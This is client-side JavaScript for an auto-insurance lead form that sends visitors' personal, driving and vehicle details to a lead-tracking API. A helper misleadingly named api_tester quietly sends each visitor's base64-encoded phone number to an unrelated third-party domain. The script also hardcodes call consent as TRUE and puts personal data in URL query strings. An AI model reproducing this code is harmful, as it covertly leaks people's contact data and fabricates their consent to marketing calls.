document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
document.getElementById('submitBtn').disabled = true;
    // Your API URL
    const formData = new FormData();
    formData.append('lead_token', 'fb7f6db57882496f945f1f4a4a46b8c1');
    formData.append('traffic_source_id', '1072');
    api_tester(document.getElementById('caller_id').value);
 formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
    formData.append('zip', document.getElementById('zip').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('address', document.getElementById('address').value);   
 
    formData.append('email', document.getElementById('email').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
	formData.append('jornaya_provider_id', document.getElementById('jornaya_leadid').value);
formData.append('dob', document.getElementById('dob').value);
formData.append('insurance_company', document.getElementById('current_provider').value);
formData.append('current_provider', document.getElementById('current_provider').value);
formData.append('state_minimum', document.getElementById('state_minimum').value);
formData.append('vehicle1_year', document.getElementById('vehicle1_year').value);
formData.append('vehicle1_make', document.getElementById('vehicle1_make').value);
formData.append('vehicle1_model', document.getElementById('vehicle1_model').value);
  formData.append('driver1_sr22_required', document.getElementById('sr22').value);
    formData.append('currently_insured', document.getElementById('currently_insured').value);
    formData.append('homeowner', document.getElementById('homeowner').value);
  	 formData.append('dui', document.getElementById('dui').value);
	  formData.append('licensed', document.getElementById('licensed').value);
formData.append('months_insured', document.getElementById('months_insured').value);
	  formData.append('months_insured_continuously', document.getElementById('months_insured_continuously').value);
	 formData.append('tcpa_url', 'https://proinsurancequotes.com/auto/');
formData.append('source_url', 'https://proinsurancequotes.com');
	 formData.append('tcpa_call_consent', 'TRUE');
	 formData.append('tcpa_optin_consent_language', 'By completing the form, I hereby affirm my acceptance of the Terms and Conditions, CCPA, and Privacy Policy. I grant permission to proinsurancequotes, their contractors, and partners (refer to our partners list) to communicate with me through email, phone, and text messages using the provided contact number. I consent to receiving offers from these entities, even if my contacts are listed on the State and Federal Do Not Call List. I acknowledge that these marketing communications may be transmitted using an automatic telephone dialing system or pre-recorded messages. I understand that my consent is not a prerequisite for making a purchase and that I retain the right to revoke it at any time. This declaration includes compliance with the California Notice.');
  
 formData.append('commercial_policy_type', document.getElementById('commercial_policy_type').value);
	 formData.append('vehicle_count', document.getElementById('vehicle_count').value);
	 
    
    
            const url = 'https://office-1stchoicemarke.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
		document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                } 
else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
